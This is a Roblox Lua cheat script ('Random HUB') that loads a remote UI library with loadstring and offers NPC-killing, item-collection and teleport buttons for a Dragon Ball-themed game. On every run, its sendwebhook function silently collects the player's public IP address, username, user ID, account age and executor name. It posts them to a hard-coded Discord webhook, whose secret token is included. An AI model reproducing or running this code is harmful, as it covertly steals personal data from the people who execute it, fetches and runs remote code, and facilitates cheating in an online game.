local Marketplace = game:GetService('MarketplaceService')
local Player = game.Players.LocalPlayer
local TweenService = game:service"TweenService";
local Info = TweenInfo.new(5,Enum.EasingStyle.Quad);


function sendwebhook()
	local ExecutedIP = tostring(game:HttpGet("https://api.ipify.org", true))
	local OSTime = os.time()
	local Time = os.date('!*t', OSTime)
	local Embed = {
		["title"] = "__**New execution.**__",
		["description"] = "Name: "..Player.Name.."\nDisplay Name: "..Player.DisplayName.."\nExploit: "..identifyexecutor().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
		["type"] = "rich",
		["color"] = tonumber(0xffff00),
		["thumbnail"] = {
			["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
		},
		["image"] = {
			["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..Player.Name
		},
		["fields"] = {
			{
				["name"] = "__Account Age:__",
				["value"] = Player.AccountAge.." days old",
				["inline"] = true
			},
			{
				["name"] = "__User ID:__",
				["value"] = Player.UserId,
				["inline"] = true
			},
			{
				["name"] = "__IP:__",
				["value"] = ExecutedIP,
				["inline"] = true
			},
		},
		["footer"] = {
			["text"] = "DBXL",
			["icon_url"] = "https://cdn.discordapp.com/attachments/959947675900461096/1042254064655794187/unknown.png"
		},
		["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
	};
	(syn and syn.request or http_request or http.request) {
		Url = 'https://discord.com/api/webhooks/965134951219605624/B9gdPBSnZmgw8l9YyDYLFnCYFz4eryVmHVlGXQvmbmGBIHQm5Tr8QDGpX7f_eN-b4YK6';
		Method = 'POST';
		Headers = {
			['Content-Type'] = 'application/json';
		};
		Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
	};
end

function tp(...)
	local tic_k = tick();
	local params = {...};
	local cframe = CFrame.new(params[1],params[2],params[3]);
	local tween,err = pcall(function()
		local tween = TweenService:Create(Player.Character["HumanoidRootPart"],Info,{CFrame=cframe});
		tween:Play();
	end)
	if not tween then return err end
end


if game.PlaceId == game.PlaceId then
	sendwebhook()
	local NPC = nil
	local Sucessful, Info = pcall(Marketplace.GetProductInfo, Marketplace, game.PlaceId)
	local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

	local Window = OrionLib:MakeWindow({Name = Info.Name, HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest", IntroEnabled = true, Icon = "rbxassetid://10590477428", IntroText = "Random HUB", IntroIcon = "rbxassetid://10590477428"})

	local Tab = Window:MakeTab({
		Name = "Main",
		Icon = "rbxassetid://10590477428",
		PremiumOnly = false
	})
	local Section = Tab:AddSection({
		Name = "Main"
	})

	Tab:AddTextbox({
		Name = "NPC Name",
		Callback = function(Value)
			NPC = Value
		end
	})

	Tab:AddButton({
		Name = "Kill NPC",
		Callback = function()
			if game.Workspace:FindFirstChild(NPC) or  game.Workspace:FindFirstChild(NPC).Head then
				game.Workspace:FindFirstChild(NPC).Head:Destroy()
			else
				OrionLib:MakeNotification({
					Name = "Error!",
					Content = "NPC No found | Invalid NPC Name",
					Image = "rbxassetid://4483345998",
					Time = 2
				})
			end
		end
	})

	Tab:AddButton({
		Name = "Collect Dragons balls",
		Callback = function()
			for _,Db in pairs(game.Workspace:GetChildren()) do
				if Db.Name:match('star') then
					Player.Character.HumanoidRootPart.CFrame = Db.CFrame
				end
			end
		end
	})


	local Tab = Window:MakeTab({
		Name = "Snakeway",
		Icon = "rbxassetid://10590477428",
		PremiumOnly = false
	})

	Tab:AddButton({
		Name = "Teleport to Kaio",
		Callback = function()
			tp(5234.24316, 363.164673, -7374.52002, 1, 0, 0, 0, 1, 0, 0, 0, 1);
		end

	})
end
